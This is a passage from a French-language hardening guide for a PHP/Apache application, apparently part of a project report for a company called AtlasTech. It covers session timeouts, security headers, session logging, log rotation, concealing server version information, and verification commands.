sudo tail -f /var/log/atlastech/auth.log
```

**Attendu** : Aucune suppression ne doit être enregistrée.

### 6.4 Test des Timeouts de Session

#### 6.4.1 Test du Timeout d'Inactivité

1. Se connecter à l'application
2. Attendre 31 minutes sans aucune activité
3. Tenter d'accéder à `dashboard.php`

**Résultat attendu** : Redirection vers `login.php?timeout=inactivity`.

#### 6.4.2 Test du Timeout Absolu

1. Se connecter à l'application
2. Rester actif pendant 2h01 (cliquer régulièrement)
3. Tenter une action

**Résultat attendu** : Redirection vers `login.php?timeout=absolute`.

### 6.5 Test des Headers de Sécurité

```bash
curl -I https://atlastech.local/atlastech/dashboard.php
```

**Vérifier la présence de tous les headers** :

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: ...
```

---

## 7. Journalisation et Monitoring

### 7.1 Création du Fichier de Log

```bash
sudo mkdir -p /var/log/atlastech
sudo touch /var/log/atlastech/auth.log
sudo touch /var/log/atlastech/session.log
sudo chown www-data:www-data /var/log/atlastech/*.log
sudo chmod 640 /var/log/atlastech/*.log
```

### 7.2 Journalisation des Événements de Session

Modifier `session_check.php` pour ajouter la journalisation :

```php
<?php
// Journalisation des timeouts
if ($inactive > $timeout_duration) {
    $log_msg = date('Y-m-d H:i:s') . " - TIMEOUT INACTIVITE: " . 
               $_SESSION['username'] . " (IP: " . $_SERVER['REMOTE_ADDR'] . 
               ", Inactivité: " . round($inactive/60, 2) . " min)\n";
    file_put_contents('/var/log/atlastech/session.log', $log_msg, FILE_APPEND);
    
    session_unset();
    session_destroy();
    header("Location: login.php?timeout=inactivity");
    exit;
}

// Journalisation des régénérations
if (time() - $_SESSION['last_regeneration'] > 900) {
    $log_msg = date('Y-m-d H:i:s') . " - REGENERATION SESSION: " . 
               $_SESSION['username'] . " (Ancien ID: " . session_id() . ")\n";
    file_put_contents('/var/log/atlastech/session.log', $log_msg, FILE_APPEND);
    
    session_regenerate_id(true);
    $_SESSION['last_regeneration'] = time();
}
?>
```

### 7.3 Rotation des Logs

Créer `/etc/logrotate.d/atlastech` :

```bash
sudo nano /etc/logrotate.d/atlastech
```

```
/var/log/atlastech/*.log {
    daily
    rotate 30
    compress
    delaycompress
    notifempty
    create 0640 www-data www-data
    sharedscripts
    postrotate
        systemctl reload apache2 > /dev/null 2>&1 || true
    endscript
}
```

**Explication** :

- **daily** : Rotation quotidienne
- **rotate 30** : Conservation de 30 jours d'historique
- **compress** : Compression des anciens logs
- **notifempty** : Pas de rotation si le fichier est vide

---

## 8. Durcissement Supplémentaire

### 8.1 Désactivation de l'Exposition de la Version PHP

```bash
sudo nano /etc/php/8.1/apache2/php.ini
```

```ini
expose_php = Off
```

### 8.2 Masquage de la Signature Apache

Déjà configuré dans le VirtualHost :

```apache
ServerSignature Off
ServerTokens Prod
```

**Vérification** :

```bash
curl -I https://atlastech.local | grep Server
```

**Résultat attendu** :
```
Server: Apache
```

(Sans numéro de version)

### 8.3 Restriction d'Accès par IP (Application CRUD)

Pour l'application CRUD (strictement interne), restreindre l'accès aux IPs du réseau local :

```apache
<Directory /var/www/html/atlastech>
    <RequireAll>
        Require all granted
        # Autoriser uniquement le réseau local
        Require ip 192.168.1.0/24
    </RequireAll>
</Directory>
```

---

## 9. Synthèse et Recommandations

### 9.1 Récapitulatif des Mesures Implémentées

**Configuration TLS** :
- TLS 1.3 activé avec algorithmes de chiffrement modernes
- Certificat SSL configuré
- Redirection HTTP vers HTTPS

**Cookies Sécurisés** :
- Attributs HttpOnly, Secure, SameSite configurés
- Protection contre XSS et interception

**Gestion des Sessions** :
- Régénération de l'ID de session après authentification
- Timeout d'inactivité (30 minutes)
- Timeout absolu (2 heures)
- Régénération périodique (15 minutes)

**Protection CSRF** :
- Tokens CSRF sur tous les formulaires
- Validation côté serveur

**Headers de Sécurité** :
- HSTS avec preload
- X-Frame-Options, X-Content-Type-Options
- Content-Security-Policy
- Permissions-Policy

**Journalisation** :
- Logs d'authentification
- Logs de session (timeouts, régénérations)
- Rotation automatique des logs

### 9.2 Points de Vigilance

**Gestion des Certificats** :
- Renouveler les certificats avant expiration
- En production, utiliser Let's Encrypt avec renouvellement automatique

**Monitoring des Sessions** :
- Surveiller les logs pour détecter des comportements anormaux
- Analyser les tentatives d'attaque CSRF

**Mises à Jour** :
- Maintenir OpenSSL, Apache et PHP à jour
- Appliquer les correctifs de sécurité rapidement

### 9.3 Améliorations Futures

**Authentification Multi-Facteurs (MFA)** :
- Implémenter TOTP pour les comptes administrateurs
- Utiliser des applications comme Google Authenticator

**Rate Limiting** :
- Limiter le nombre de tentatives de connexion
- Implémenter avec Fail2Ban ou mod_evasive

**Session Storage** :
- Migrer vers Redis ou Memcached pour les sessions
- Améliorer les performances et la scalabilité

**Monitoring Avancé** :
- Intégrer avec un SIEM (Wazuh, ELK)
- Alertes en temps réel sur les événements critiques

---

## 10. Diagrammes et Schémas

### 10.1 Flux d'Authentification Sécurisé

[Espace réservé pour diagramme]

```
1. Utilisateur saisit identifiants
2. Formulaire soumis avec token CSRF via HTTPS
3. Serveur vérifie token CSRF
4. Serveur vérifie identifiants (requête préparée)
5. Serveur régénère l'ID de session
6. Serveur définit cookies sécurisés (HttpOnly, Secure, SameSite)
7. Serveur enregistre timestamp de connexion
8. Redirection vers dashboard
```

### 10.2 Architecture de Sécurité des Sessions

[Espace réservé pour schéma architectural]

```
                         NAVIGATEUR
                             |
                    [Cookie Session]
                  HttpOnly | Secure | SameSite
                             |
                        HTTPS/TLS 1.3
                             |
                       SERVEUR APACHE
                             |
                   +---------+---------+
                   |                   |
            [session_check.php]   [csrf.php]
                   |                   |
            - Timeout vérif      - Token génération
            - Régénération       - Token validation
            - Journalisation     
                   |
            SESSION SERVEUR
         (/var/lib/php/sessions)
```

### 10.3 Timeline de Gestion de Session

[Espace réservé pour timeline]

```
T=0min    : Connexion, régénération ID, login_time
T=15min   : Régénération automatique ID
T=30min   : Régénération automatique ID
T=31min   : TIMEOUT inactivité (si aucune activité)
T=45min   : Régénération automatique ID
T=120min  : TIMEOUT absolu (déconnexion forcée)
```

---

## 11. Commandes de Vérification Rapide

### 11.1 Check-list de Vérification Post-Implémentation

```bash
# Vérification TLS
openssl s_client -connect atlastech.local:443 -tls1_3 2>&1 | grep "Protocol"

# Vérification Headers
curl -I https://atlastech.local 2>&1 | grep -E "Strict-Transport|X-Frame|X-Content|Content-Security"

# Vérification Configuration PHP
php -i | grep -E "session.cookie_httponly|session.cookie_secure|session.cookie_samesite"

# Vérification Logs
sudo tail -20 /var/log/atlastech/auth.log

# Vérification Permissions Sessions
ls -la /var/lib/php/sessions

# Test Redirection HTTP->HTTPS
curl -I http://atlastech.local 2>&1 | grep Location
```

### 11.2 Commandes de Diagnostic

En cas de problème :

```bash
# Vérifier Statut Apache
sudo systemctl status apache2

# Vérifier Configuration Apache
sudo apache2ctl -t

# Vérifier Modules Apache
apache2ctl -M | grep -E "ssl|headers"

# Vérifier Logs Erreurs Apache
sudo tail -f /var/log/apache2/error.log

# Vérifier Connexions HTTPS Actives
sudo netstat -tlnp | grep :443

# Vérifier Sessions Actives
sudo ls -lt /var/lib/php/sessions | head -20
```

---

## Conclusion

La sécurisation des sessions et la mise en œuvre de HTTPS avec TLS 1.3 constituent des fondations essentielles pour protéger l'infrastructure d'AtlasTech Solutions contre les attaques modernes. Les mécanismes implémentés dans ce chapitre protègent contre un large éventail de menaces, notamment l'interception de sessions, la fixation de session, les attaques CSRF et l'exposition des données sensibles.

L'approche multicouche adoptée (chiffrement, cookies sécurisés, tokens CSRF, headers de sécurité, timeouts) illustre le principe de défense en profondeur : même si un mécanisme échoue, d'autres couches de protection restent actives.

La journalisation systématique des événements de session permet non seulement de détecter les tentatives d'intrusion, mais aussi de respecter les exigences de traçabilité imposées par le RGPD et les normes ISO/IEC 27001.

Ces mesures doivent être considérées comme un point de départ et non une fin en soi. La sécurité est un processus continu nécessitant une surveillance constante, des mises à jour régulières et une adaptation aux nouvelles menaces.
